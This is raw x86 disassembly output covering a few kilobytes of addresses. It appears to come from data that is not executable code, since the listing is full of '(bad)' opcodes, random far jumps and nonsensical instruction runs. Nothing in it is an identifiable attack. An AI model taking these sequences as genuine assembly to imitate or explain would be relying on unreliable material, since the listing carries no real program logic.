  42aa6c:	add    cl,cl
  42aa6e:	pushf  
  42aa6f:	cmp    edi,DWORD PTR [edx]
  42aa71:	xor    BYTE PTR [ecx],bl
  42aa73:	add    BYTE PTR [eax-0x61],bh
  42aa76:	mov    ebp,0x4085413f
  42aa7b:	pop    ebx
  42aa7c:	ror    DWORD PTR [edi+0xcabe784],1
  42aa82:	push   ebp
  42aa83:	mov    DWORD PTR [ecx],edi
  42aa85:	shr    cl,1
  42aa87:	test   al,0xa9
  42aa89:	cwde   
  42aa8a:	into   
  42aa8b:	sahf   
  42aa8c:	mov    eax,ds:0x7fdc01cc
  42aa91:	cmp    ebp,DWORD PTR [ecx+0x42]
  42aa94:	add    DWORD PTR [esi+0x28],ebx
  42aa97:	adc    ebx,DWORD PTR [ebx-0x3da50d79]
  42aa9d:	sbb    DWORD PTR [edi-0xb],esp
  42aaa0:	xlat   BYTE PTR ds:[ebx]
  42aaa1:	icebp  
  42aaa2:	(bad)  
  42aaa3:	icebp  
  42aaa4:	mov    ebp,0xce5ede0e
  42aaa9:	cmc    
  42aaaa:	mov    edx,0x91b218a5
  42aaaf:	(bad)  
  42aab0:	(bad)  
  42aab1:	js     0x42aacc
  42aab3:	stc    
  42aab4:	or     al,0x68
  42aab6:	adc    edi,esp
  42aab8:	sub    dl,bl
  42aaba:	pusha  
  42aabb:	nop
  42aabc:	add    edx,DWORD PTR [eax]
  42aabe:	fs sub al,0xb1
  42aac1:	aad    0x37
  42aac3:	push   ebp
  42aac4:	rcl    BYTE PTR [edx],cl
  42aac6:	(bad)  
  42aac7:	retf   
  42aac8:	fisttp QWORD PTR [eax-0x5a9aeae4]
  42aace:	sub    BYTE PTR [ebp-0x62],dl
  42aad1:	mov    dl,0x1
  42aad3:	enter  0xb311,0xe9
  42aad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aad8:	iret   
  42aad9:	mov    esp,0xec74d56b
  42aadf:	jb     0x42aab5
  42aae1:	test   eax,0x684c4aa1
  42aae6:	fucom  st(1)
  42aae8:	and    al,0x37
  42aaea:	dec    eax
  42aaeb:	push   cs
  42aaec:	dec    ebx
  42aaed:	sbb    al,BYTE PTR [ebx+edi*8+0x46]
  42aaf1:	icebp  
  42aaf2:	sbb    al,0x1
  42aaf4:	mov    eax,0x56b74f44
  42aaf9:	and    ecx,DWORD PTR [edx-0x19]
  42aafc:	scas   al,BYTE PTR es:[edi]
  42aafd:	inc    ecx
  42aafe:	aas    
  42aaff:	test   eax,0xc63a835c
  42ab04:	je     0x42ab34
  42ab06:	mov    dl,BYTE PTR [edx]
  42ab08:	dec    edi
  42ab09:	fmul   DWORD PTR [edi-0x64]
  42ab0c:	sub    ch,BYTE PTR [ecx]
  42ab0e:	ds retf 0x62a4
  42ab12:	jge    0x42aaf6
  42ab14:	inc    eax
  42ab15:	(bad)  
  42ab16:	xor    al,0x73
  42ab18:	jl     0x42aab3
  42ab1a:	push   esi
  42ab1b:	cld    
  42ab1c:	lock rol BYTE PTR [eax+0x16],0x17
  42ab21:	mov    WORD PTR [eax],?
  42ab23:	add    eax,0xe1c63b96
  42ab28:	mov    al,0x20
  42ab2a:	lods   eax,DWORD PTR ds:[esi]
  42ab2b:	dec    edx
  42ab2c:	in     eax,0x33
  42ab2e:	sbb    ah,bl
  42ab30:	sub    BYTE PTR [ecx],0x1c
  42ab33:	mov    edx,db7
  42ab36:	call   0x49fb:0x1076ea4f
  42ab3d:	mov    bh,0x4f
  42ab3f:	and    ecx,DWORD PTR [edi+0x40]
	...
  42abb2:	add    BYTE PTR [eax],al
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	pop    edx
  42abc1:	in     eax,0xcf
  42abc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abc4:	jb     0x42ab8b
  42abc6:	add    DWORD PTR [eax],eax
  42abc8:	test   BYTE PTR [eax],0x0
  42abcb:	add    BYTE PTR [ecx],cl
  42abcd:	push   0x4c
  42abcf:	fst    DWORD PTR [ecx-0x281a9171]
  42abd5:	loop   0x42ac43
  42abd7:	imul   edi,DWORD PTR ds:0xc7bce792,0x4c
  42abde:	adc    DWORD PTR [ecx+ebx*2-0x75],eax
  42abe2:	mov    ebx,0x5bc44f2c
  42abe7:	mov    bl,BYTE PTR [ebx-0x56]
  42abea:	xchg   BYTE PTR [ebx],ah
  42abec:	add    eax,DWORD PTR [ebp+0x3b4b4910]
  42abf2:	loopne 0x42ab74
  42abf4:	ss repnz out 0x44,al
  42abf8:	xchg   esp,eax
  42abf9:	or     ah,BYTE PTR [esi+eiz*2+0x1d]
  42abfd:	add    BYTE PTR [edx+0x35],bl
  42ac00:	mov    ds:0x5654d4fb,al
  42ac05:	rcl    BYTE PTR [edx+0x1e42a123],1
  42ac0b:	mov    ecx,0xcd33c4ea
  42ac10:	add    cl,BYTE PTR [eax+ebp*8+0x68fe168b]
  42ac17:	mov    al,ds:0xd0f4cc23
  42ac1c:	mov    edx,0xca1aef92
  42ac21:	loop   0x42ac88
  42ac23:	inc    ebx
  42ac24:	fbstp  TBYTE PTR [edi]
  42ac26:	mov    ebx,0xfe38972b
  42ac2b:	mov    dh,0xe4
  42ac2d:	mov    eax,0xa074d91c
  42ac32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac33:	int    0x59
  42ac35:	mov    ebx,0xa8119bd
  42ac3a:	push   ebx
  42ac3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac3c:	fsub   QWORD PTR gs:[esi]
  42ac3f:	dec    ebp
  42ac40:	jl     0x42ac28
  42ac42:	fnstcw WORD PTR [esi+esi*4-0x6b]
  42ac46:	scas   eax,DWORD PTR es:[edi]
  42ac47:	mov    edi,ds
  42ac49:	dec    ecx
  42ac4a:	nop
  42ac4b:	addr16 or al,0x17
  42ac4e:	mov    ah,al
  42ac50:	fidivr WORD PTR [esi-0x141b5d33]
  42ac56:	and    BYTE PTR [eax+0x50],0x2d
  42ac5a:	stos   BYTE PTR es:[edi],al
  42ac5b:	cwde   
  42ac5c:	push   ecx
  42ac5d:	sub    al,0x75
  42ac5f:	xchg   esp,eax
  42ac60:	xchg   esi,eax
  42ac61:	xor    DWORD PTR [edx-0x20],esi
  42ac64:	add    al,0xa7
  42ac66:	add    esp,eax
  42ac68:	sar    DWORD PTR [esi],0x8b
  42ac6b:	push   ds
  42ac6c:	shr    ebx,0x3a
  42ac6f:	xchg   esi,eax
  42ac70:	and    esi,DWORD PTR [edx-0x7f]
  42ac73:	add    eax,0x2a67b23c
  42ac78:	lock jle 0x42ac84
  42ac7b:	push   eax
  42ac7c:	cmp    al,0x3e
  42ac7e:	retf   
  42ac7f:	je     0x42ac3d
  42ac81:	cmc    
  42ac82:	es pop ds
  42ac84:	or     al,0x4d
  42ac86:	pushf  
  42ac87:	sbb    ebp,edi
  42ac89:	add    eax,0x17731b67
  42ac8e:	jmp    0x1881:0x43dc1585
  42ac95:	push   0x419cb2c6
  42ac9a:	imul   esi,DWORD PTR [edi+0x4],0x3b
  42ac9e:	or     edi,edi
  42aca0:	xchg   ecx,eax
  42aca1:	ins    DWORD PTR es:[edi],dx
  42aca2:	and    ecx,DWORD PTR [eax+0x3adba78d]
  42aca8:	or     BYTE PTR [eax+eiz*8-0x78],ah
  42acac:	xor    DWORD PTR [esi],0x70c8c8dd
  42acb2:	inc    esi
  42acb3:	test   esi,edi
  42acb5:	data16 and dl,BYTE PTR [eax-0x7]
  42acb9:	xchg   cl,ch
  42acbb:	or     eax,DWORD PTR [ebx]
  42acbd:	out    0xe9,al
  42acbf:	pop    ss
  42acc0:	dec    BYTE PTR [eax+eax*1]
	...
  42ad33:	add    BYTE PTR [ebx-0x13f33b49],bl
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	mov    cr1,edi
  42ad42:	jl     0x42ad6d
  42ad44:	push   0xf60001c6
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    ch,bh
  42ad4d:	jno    0x42ad12
  42ad4f:	ja     0x42adb2
  42ad51:	into   
  42ad52:	jbe    0x42ad89
  42ad54:	ins    DWORD PTR es:[edi],dx
  42ad55:	push   edx
  42ad56:	adc    eax,0xb26b5ab0
  42ad5b:	fistp  QWORD PTR [esi-0x72119380]
  42ad61:	adc    al,BYTE PTR [ebx]
  42ad63:	loop   0x42ad88
  42ad65:	enter  0xcac7,0x35
  42ad69:	in     al,dx
  42ad6a:	test   DWORD PTR [esi],ebp
  42ad6c:	mov    eax,0x364eacf6
  42ad71:	adc    DWORD PTR [edi-0x2f],ebx
  42ad74:	dec    ebp
  42ad75:	add    edx,DWORD PTR [ecx-0x171eb680]
  42ad7b:	jge    0x42ad9c
  42ad7d:	retf   0x3cfe
  42ad80:	xor    dl,0x2
  42ad83:	cdq    
  42ad84:	jmp    0x42adc8
  42ad86:	sti    
  42ad87:	xchg   edi,eax
  42ad88:	jl     0x42ad86
  42ad8a:	and    esp,DWORD PTR [ebx]
  42ad8c:	push   0xffffffc0
  42ad8e:	jp     0x42ad31
  42ad90:	out    dx,eax
  42ad91:	sahf   
  42ad92:	or     DWORD PTR [edi+0x34],esp
  42ad95:	mov    eax,ds:0x52d725ee
  42ad9a:	or     ah,al
  42ad9c:	sbb    al,0x14
  42ad9e:	mov    edi,0x825b5056
  42ada3:	mov    ah,0xf6
  42ada5:	loopne 0x42adbb
  42ada7:	push   edx
  42ada8:	and    DWORD PTR [esi+0x4b3080c0],esp
  42adae:	or     edx,DWORD PTR [esi+ebp*1+0x64727353]
  42adb5:	push   0x80d3f73f
  42adba:	add    al,0x8
  42adbc:	into   
  42adbd:	add    cl,BYTE PTR [ebx]
  42adbf:	jg     0x42ad87
  42adc1:	mov    WORD PTR [ebp+edi*1-0x7d143943],fs
  42adc8:	jns    0x42ada9
  42adca:	pusha  
  42adcb:	out    0xf6,eax
  42adcd:	es daa 
  42adcf:	inc    esp
  42add0:	xchg   esi,eax
  42add1:	lods   al,BYTE PTR ds:[esi]
  42add2:	call   0xc0215d18
  42add7:	cld    
  42add8:	sbb    eax,0x501c5e82
  42addd:	in     al,dx
  42adde:	and    eax,0x3a4f7d37
  42ade3:	iret   
  42ade4:	js     0x42ad86
  42ade6:	pop    ds
  42ade7:	xchg   esp,eax
  42ade8:	retf   
  42ade9:	pop    eax
  42adea:	dec    eax
  42adeb:	push   0x2ee87b8b
  42adf0:	jecxz  0x42adff
  42adf2:	(bad)  
  42adf3:	xchg   edx,eax
  42adf4:	imul   eax,edi,0x5cb81984
  42adfa:	cmp    ecx,ebp
  42adfc:	call   0x9859:0x2db1d6a8
  42ae03:	sbb    eax,0x80391a6e
  42ae08:	xor    ecx,DWORD PTR [edx]
  42ae0a:	(bad)  [eax+eiz*2-0x30]
  42ae0e:	inc    ecx
  42ae0f:	or     DWORD PTR [ebx+0x22],ecx
  42ae12:	cdq    
  42ae13:	retf   0xc25f
  42ae16:	cmp    bh,bl
  42ae18:	sar    ch,cl
  42ae1a:	add    edi,DWORD PTR [ecx+0x3287cfda]
  42ae20:	fdivr  QWORD PTR [ecx-0x1ffbd68c]
  42ae26:	test   eax,0x358fa36b
  42ae2b:	fsubp  st(5),st
  42ae2d:	aam    0x3a
  42ae2f:	xchg   esi,eax
  42ae30:	les    edi,FWORD PTR [edi-0x33]
  42ae33:	aam    0x1a
  42ae35:	iret   
  42ae36:	ret    
  42ae37:	adc    al,0x86
  42ae39:	jb     0x42ae43
  42ae3b:	jl     0x42ae8a
  42ae3d:	mov    dl,0x7b
  42ae3f:	dec    ebp
  42ae40:	sbb    esp,DWORD PTR [edi+0x0]
	...
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	mov    ebp,0x5e242ce2
  42aec5:	mov    DWORD PTR [ecx],0xf600
  42aecb:	add    BYTE PTR [edx-0x48d3b83d],ah
  42aed1:	mov    WORD PTR ds:0x4c01381d,fs
  42aed7:	jns    0x42aecd
  42aed9:	(bad)  
  42aeda:	jp     0x42ae9a
  42aedc:	sub    eax,0x9fdd27bc
  42aee1:	add    dl,ch
  42aee3:	pop    ebp
  42aee4:	lods   eax,DWORD PTR ds:[esi]
  42aee5:	inc    esi
  42aee6:	mov    ebx,0x5966532f
  42aeeb:	mov    esp,0xd6ff0f48
  42aef0:	mov    ds:0x36320698,eax
  42aef5:	ror    DWORD PTR [esi],cl
  42aef7:	dec    edx
  42aef8:	shl    cl,cl
  42aefa:	sub    al,0xd5
  42aefc:	mov    dl,0xb1
  42aefe:	sbb    bl,BYTE PTR gs:[edi-0x3b4a123a]
  42af05:	and    BYTE PTR [ecx+0x79],al
  42af08:	jb     0x42aea3
  42af0a:	out    dx,al
  42af0b:	fcom   DWORD PTR [edi+0x28]
  42af0e:	aas    
  42af0f:	sti    
  42af10:	mov    ecx,0xd36ad006
  42af15:	inc    eax
  42af16:	xchg   ebx,eax
  42af17:	call   0x8b4f:0xb5887072
  42af1e:	test   al,0x9d
  42af20:	mov    ds:0x790e2b00,al
  42af25:	loopne 0x42aed8
  42af27:	cdq    
  42af28:	add    al,0x46
  42af2a:	sbb    esi,0x4b90b73f
  42af30:	add    ebp,DWORD PTR [ebp-0x3320f7d1]
  42af36:	lods   eax,DWORD PTR ds:[esi]
  42af37:	into   
  42af38:	push   cs
  42af39:	mov    bh,0xa8
  42af3b:	mov    cl,0x81
  42af3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af3f:	call   0x58718721
  42af44:	fstp   TBYTE PTR [ecx]
  42af46:	mov    ds:0xd43987b3,al
  42af4b:	push   ebp
  42af4c:	repz ret 0xb4c0
  42af50:	pop    ss
  42af51:	xlat   BYTE PTR ds:[ebx]
  42af52:	ficom  DWORD PTR [edi]
  42af54:	mov    esp,0x3ce311b7
  42af59:	lods   al,BYTE PTR ds:[esi]
  42af5a:	out    dx,al
  42af5b:	pop    edi
  42af5c:	dec    edx
  42af5d:	stos   DWORD PTR es:[edi],eax
  42af5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af5f:	pop    ebx
  42af60:	push   ss
  42af61:	sub    al,0xef
  42af63:	test   DWORD PTR [ebp+0x7f],esi
  42af66:	mov    ah,0x69
  42af68:	retf   0x409d
  42af6b:	test   al,ah
  42af6d:	gs out dx,al
  42af6f:	mov    WORD PTR [edi-0x1ac8248f],es
  42af75:	(bad)  
  42af76:	xchg   ebp,eax
  42af77:	test   BYTE PTR [esi],0xb4
  42af7a:	xor    BYTE PTR [ecx],dh
  42af7c:	and    DWORD PTR [ebx-0x4696ef4f],esi
  42af82:	xor    DWORD PTR [eax],ecx
  42af84:	push   edi
  42af85:	test   BYTE PTR [ebp-0x1d],ch
  42af88:	stc    
  42af89:	jmp    0xa84c:0xddc2d309
  42af90:	loope  0x42afdd
  42af92:	rcl    BYTE PTR [esi-0x32],cl
  42af95:	sub    BYTE PTR [edx+0x74a16296],bh
  42af9b:	jae    0x42aff9
  42af9d:	jo     0x42b001
  42af9f:	mov    esp,0x93bac0b9
  42afa4:	ins    BYTE PTR es:[edi],dx
  42afa5:	pop    ebp
  42afa6:	stos   BYTE PTR es:[edi],al
  42afa7:	jmp    0x42b028
  42afa9:	loopne 0x42af8e
  42afab:	lock xchg ecx,eax
  42afad:	inc    esp
  42afae:	(bad)  [eax-0x80]
  42afb1:	ss inc edi
  42afb3:	shr    BYTE PTR [esi-0x5f],cl
  42afb6:	or     cl,BYTE PTR [ebx]
  42afb8:	add    al,0xe8
  42afba:	dec    edi
  42afbb:	mov    dh,0x84
  42afbd:	fnstcw WORD PTR [ebx-0x6a]
  42afc0:	jle    0x42afa8
	...
  42b032:	add    BYTE PTR [eax],al
  42b034:	xlat   BYTE PTR ds:[ebx]
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x54ff
  42b042:	xchg   esi,eax
  42b044:	push   esp
  42b045:	enter  0x1,0xf6
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [esi],ch
  42b04d:	test   ebx,eax
  42b04f:	adc    BYTE PTR ds:0x9201a76a,0xa3
  42b056:	dec    eax
  42b057:	xlat   BYTE PTR ds:[ebx]
  42b058:	gs pusha 
  42b05a:	fwait
  42b05b:	in     al,dx
  42b05c:	xchg   esi,eax
  42b05d:	pushf  
  42b05e:	aad    0x59
  42b060:	loope  0x42b03d
  42b062:	les    ebp,FWORD PTR fs:[ebx+esi*1]
  42b066:	(bad)  
  42b067:	retf   0x9d09
  42b06a:	fucomp st(1)
  42b06c:	sbb    ah,bh
  42b06e:	dec    edi
  42b06f:	xchg   esi,eax
  42b070:	stc    
  42b071:	pop    ds
  42b072:	test   al,0x68
  42b074:	and    dh,BYTE PTR [ebp+0x30]
  42b077:	aas    
  42b078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b079:	stc    
  42b07a:	dec    edx
  42b07b:	push   0xabf14e47
  42b080:	sbb    edi,DWORD PTR [edx+0x3afac88e]
  42b086:	inc    ebx
  42b087:	sbb    bh,BYTE PTR [edx+0x37e44765]
  42b08d:	mov    DWORD PTR ds:0x712447ca,0x4d42319e
  42b097:	repnz shr BYTE PTR [ebx+0x12],cl
  42b09b:	xor    al,0x52
  42b09d:	jmp    0xf4019884
  42b0a2:	out    0x1f,al
  42b0a4:	adc    BYTE PTR [ebx],ch
  42b0a6:	dec    edx
  42b0a7:	int    0xb8
  42b0a9:	cmp    DWORD PTR [esi-0x17],edi
  42b0ac:	loopne 0x42b09c
  42b0ae:	mov    esi,0x25e61d5c
  42b0b3:	lods   eax,DWORD PTR ds:[esi]
  42b0b4:	mov    edx,0x8c86588
  42b0b9:	sbb    BYTE PTR [ecx+0x183b55e4],0x69
  42b0c0:	xchg   ecx,eax
  42b0c1:	loope  0x42b0f8
  42b0c3:	ds fld st(3)
  42b0c6:	jnp    0x42b0df
  42b0c8:	ja     0x42b0bd
  42b0ca:	idiv   BYTE PTR [ebp-0x49]
  42b0cd:	repz dec edx
  42b0cf:	data16 sub al,0x71
  42b0d2:	shl    BYTE PTR [edx+0x7faef32c],0x8e
  42b0d9:	imul   ebx,DWORD PTR [ebx-0x75c2dacf],0x98af9343
  42b0e3:	dec    edi
  42b0e4:	jecxz  0x42b086
  42b0e6:	push   es
  42b0e7:	arpl   WORD PTR [ecx],si
  42b0e9:	mov    BYTE PTR [esi-0x474e26f5],al
  42b0ef:	and    DWORD PTR [esi-0x1a2a0264],esi
  42b0f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0f6:	jmp    0x42b165
  42b0f8:	stos   BYTE PTR es:[edi],al
  42b0f9:	dec    ebp
  42b0fa:	pop    ebp
  42b0fb:	out    0x8e,eax
  42b0fd:	pop    ds
  42b0fe:	pop    ds
  42b0ff:	dec    ebx
  42b100:	cmc    
  42b101:	push   0xffffffd1
  42b103:	icebp  
  42b104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b105:	xor    BYTE PTR [eax-0x2b],dh
  42b108:	dec    edx
  42b109:	fnclex 
  42b10b:	dec    ebp
  42b10c:	lods   eax,DWORD PTR ds:[esi]
  42b10d:	and    eax,0x4427ab41
  42b112:	call   FWORD PTR [ebx]
  42b114:	inc    edi
  42b115:	push   0xffffff90
  42b117:	in     al,0x5
  42b119:	popa   
  42b11a:	js     0x42b18c
  42b11c:	in     al,dx
  42b11d:	xchg   ebx,eax
  42b11e:	cwde   
  42b11f:	cmp    BYTE PTR [edi+0x2],bh
  42b122:	(bad)  
  42b123:	outs   dx,BYTE PTR ds:[esi]
  42b124:	lock inc ebp
  42b126:	add    BYTE PTR [esi+0x69],bl
  42b129:	aad    0x92
  42b12b:	icebp  
  42b12c:	sub    eax,0x62f0013a
  42b131:	pop    ss
  42b132:	xor    eax,0xcb31ae21
  42b137:	cmp    ecx,DWORD PTR [eax-0x4cf3d2c7]
  42b13d:	mov    esp,eax
  42b13f:	outs   dx,DWORD PTR ds:[esi]
  42b140:	adc    eax,0x8e
	...
  42b1b1:	add    BYTE PTR [eax],al
  42b1b3:	add    BYTE PTR [ebx],ch
  42b1b5:	test   DWORD PTR [ebp-0x50e640e7],edx
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	jmp    0x4abfd8cb
  42b1c5:	leave  
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	test   BYTE PTR [eax],0x0
  42b1cb:	add    BYTE PTR [edi],al
  42b1cd:	fdivr  QWORD PTR [esi]
  42b1cf:	into   
  42b1d0:	or     bl,BYTE PTR [eax-0x4c]
  42b1d3:	push   ss
  42b1d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1d6:	adc    edx,DWORD PTR [edi]
  42b1d8:	test   eax,0xabfde3c5
  42b1dd:	add    al,0x51
  42b1df:	push   edx
  42b1e0:	cmp    eax,edi
  42b1e2:	rcr    DWORD PTR [ecx],cl
  42b1e4:	add    BYTE PTR [ebp-0x46f1bbcc],al
  42b1ea:	hlt    
  42b1eb:	and    BYTE PTR [ebp+esi*4-0x45],bl
  42b1ef:	mov    bh,0xe3
  42b1f1:	retf   0xf9d6
  42b1f4:	add    al,BYTE PTR [edi+0xf5e1d73]
  42b1fa:	xchg   BYTE PTR [edx+0xadf9445],bh
  42b200:	mov    edx,DWORD PTR [ebx+ebx*1]
  42b203:	test   DWORD PTR [edx-0x55],esp
  42b206:	push   eax
  42b207:	pop    ss
  42b208:	sub    BYTE PTR [edi-0x58],bh
  42b20b:	pop    esp
  42b20c:	sub    eax,0x15ec5f86
  42b211:	pop    esp
  42b212:	popf   
  42b213:	adc    BYTE PTR [esi],ah
  42b215:	push   edx
  42b216:	xor    dh,BYTE PTR [ebp-0x63d2b56a]
  42b21c:	push   ebp
  42b21d:	mov    esi,0xab537c2f
  42b222:	and    eax,DWORD PTR [ecx]
  42b224:	and    esi,DWORD PTR [edx+eax*1]
  42b227:	mov    eax,ds:0xab2738bb
  42b22c:	test   al,0xf6
  42b22e:	mov    ebp,0xced8792f
  42b233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b234:	pushf  
  42b235:	xor    edx,DWORD PTR [edi]
  42b237:	aad    0xc
  42b239:	adc    bh,BYTE PTR [eax+0x28]
  42b23c:	retf   
  42b23d:	or     ah,BYTE PTR [ebx]
  42b23f:	xchg   DWORD PTR [ebp-0x7c],eax
  42b242:	mov    WORD PTR [ecx+0x60e7c594],es
  42b248:	cmp    al,0x3e
  42b24a:	sahf   
  42b24b:	or     DWORD PTR [esi+0x5f],edx
  42b24e:	cmp    cl,BYTE PTR [edi]
  42b250:	cmp    bh,BYTE PTR [edx]
  42b252:	cmp    DWORD PTR [esi+edx*2+0x5],ebp
  42b256:	and    DWORD PTR [ecx-0x6de73b81],ecx
  42b25c:	adc    DWORD PTR [eax+0x53edf780],edx
  42b262:	pushf  
  42b263:	add    DWORD PTR [esi-0x79d70c6c],0x7c627ab1
  42b26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b26e:	(bad)  
  42b26f:	mov    eax,ds:0xf136f41d
  42b274:	push   eax
  42b275:	imul   eax,eax,0xffffffd9
  42b278:	mov    al,ds:0xa8a28724
  42b27d:	pop    ss
  42b27e:	pop    edi
  42b27f:	lods   al,BYTE PTR ds:[esi]
  42b280:	icebp  
  42b281:	mov    WORD PTR [edi+0x3cb10e82],ss
  42b287:	bound  edi,QWORD PTR [eax-0x44]
  42b28a:	test   eax,0x24d9a4b1
  42b28f:	repz pop ebp
  42b291:	push   edx
  42b292:	sbb    ecx,esi
  42b294:	add    al,0x3b
  42b296:	xchg   edi,eax
  42b297:	data16 cli 
  42b299:	mov    fs,WORD PTR [ecx+ebx*2+0x4c48e63b]
  42b2a0:	lea    ebx,[edx]
  42b2a2:	fldcw  WORD PTR [ebx+0x58638fa4]
  42b2a8:	aad    0xeb
  42b2aa:	push   es
  42b2ab:	pop    ss
  42b2ac:	cli    
  42b2ad:	mov    dl,0xda
  42b2af:	fist   WORD PTR [esi+0x6f6b9fa9]
  42b2b5:	stos   DWORD PTR es:[edi],eax
  42b2b6:	jl     0x42b29c
  42b2b8:	lods   eax,DWORD PTR ds:[esi]
  42b2b9:	cs pop ebp
  42b2bb:	test   al,ch
  42b2bd:	sbb    esp,ecx
  42b2bf:	sbb    ah,BYTE PTR [ebx-0x6]
	...
  42b332:	add    BYTE PTR [eax],al
  42b334:	jg     0x42b344
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax+0x78],esi
  42b341:	ficom  DWORD PTR [edi+0x1e]
  42b344:	inc    eax
  42b345:	retf   0x1
  42b348:	test   BYTE PTR [eax],0x0
  42b34b:	add    BYTE PTR [edi],dh
  42b34d:	lds    eax,FWORD PTR [ebx]
  42b34f:	push   edi
  42b350:	out    dx,eax
  42b351:	jg     0x42b329
  42b353:	leave  
  42b354:	jns    0x42b333
  42b356:	and    al,0x5c
  42b358:	pop    eax
  42b359:	fst    QWORD PTR [ebp+0x5c9870ae]
  42b35f:	(bad)  
  42b360:	fild   QWORD PTR [ebx]
  42b362:	out    dx,al
  42b363:	loope  0x42b384
  42b365:	sub    BYTE PTR [esi-0x7218c519],0xa9
  42b36c:	or     BYTE PTR [eax-0x36],cl
  42b36f:	cdq    
  42b370:	cs add eax,0x57976fa1
  42b376:	xor    eax,0x81c22995
  42b37b:	jmp    0x1123:0x8c86718c
  42b382:	je     0x42b3f7
  42b384:	sbb    eax,DWORD PTR [edi+0x5e]
  42b387:	ds rcl ah,1
  42b38a:	pushf  
  42b38b:	xchg   esi,eax
  42b38c:	jmp    0xeb97b1e1
  42b391:	dec    ecx
  42b392:	rol    BYTE PTR [bx+si-0x41fe],0x64
  42b398:	bound  edi,QWORD PTR [ecx-0x5386aa52]
  42b39e:	retf   
  42b39f:	ficom  WORD PTR [ecx+0x8]
  42b3a2:	arpl   WORD PTR [ebp-0x67ea3a38],ax
  42b3a8:	and    eax,esi
  42b3aa:	mov    edi,esi
  42b3ac:	mov    eax,0x24d2364a
  42b3b1:	dec    edx
  42b3b2:	inc    ebx
  42b3b3:	aad    0xfa
  42b3b5:	das    
  42b3b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b3b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3b8:	xchg   ecx,eax
  42b3b9:	pop    eax
  42b3ba:	mov    ebp,0x6e12ddae
  42b3bf:	shr    DWORD PTR ds:0x648630a8,cl
  42b3c5:	daa    
  42b3c6:	in     al,dx
  42b3c7:	sbb    eax,edi
  42b3c9:	sahf   
  42b3ca:	pop    esp
  42b3cb:	xchg   BYTE PTR [eax-0xc448003],dl
  42b3d1:	add    DWORD PTR [edx-0x17],ebp
  42b3d4:	jmp    0xd83f9df6
  42b3d9:	adc    BYTE PTR [eax+0x384d8836],0x4d
  42b3e0:	jmp    0xb965eb72
  42b3e5:	sub    DWORD PTR [edx-0x5ea6d375],0xe91ecd9d
  42b3ef:	jg     0x42b3fe
  42b3f1:	je     0x42b3f7
  42b3f3:	aam    0x5d
  42b3f5:	scas   al,BYTE PTR es:[edi]
  42b3f6:	test   eax,0x4525d06e
  42b3fb:	add    DWORD PTR [edx-0x47a6a955],ebx
  42b401:	dec    esp
  42b402:	nop
  42b403:	mov    ecx,ebp
  42b405:	retf   
  42b406:	ins    DWORD PTR es:[edi],dx
  42b407:	not    DWORD PTR [edx+0x21]
  42b40a:	pusha  
  42b40b:	(bad)  
  42b40c:	cmp    eax,0x358f2070
  42b411:	leave  
  42b412:	sbb    ah,dl
  42b414:	mov    WORD PTR [edi],?
  42b416:	push   esp
  42b417:	ss pop ds
  42b419:	jp     0x42b3d4
  42b41b:	dec    esi
  42b41c:	test   eax,0x88e0dc00
  42b421:	push   es
  42b422:	mov    dl,0x45
  42b424:	jbe    0x42b477
  42b426:	add    eax,0xfccbdc34
  42b42b:	mov    esi,0xc5170eda
  42b430:	inc    esp
  42b431:	mov    ebp,0x64cbe37f
  42b436:	sahf   
  42b437:	sub    al,0xd1
  42b439:	fstp   TBYTE PTR [edi+0x642c321a]
  42b43f:	cmp    esp,DWORD PTR [eax]
  42b441:	jns    0x42b443
	...
  42b4b3:	add    BYTE PTR [eax],bl
  42b4b5:	dec    edi
  42b4b6:	pop    ss
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	(bad)  
  42b4c1:	mov    cl,0x51
  42b4c3:	mov    al,ds:0x1cb36
  42b4c8:	test   BYTE PTR [eax],0x0
  42b4cb:	add    BYTE PTR [ebx],ah
  42b4cd:	popf   
  42b4ce:	enter  0xb49f,0xeb
  42b4d2:	shl    bh,cl
  42b4d4:	jmp    0x42b49d
  42b4d6:	jmp    0x59bea2c0
  42b4db:	inc    esi
  42b4dc:	inc    edi
  42b4dd:	xchg   ebp,eax
  42b4de:	aad    0x46
  42b4e0:	push   eax
  42b4e1:	int3   
  42b4e2:	mov    dh,0xca
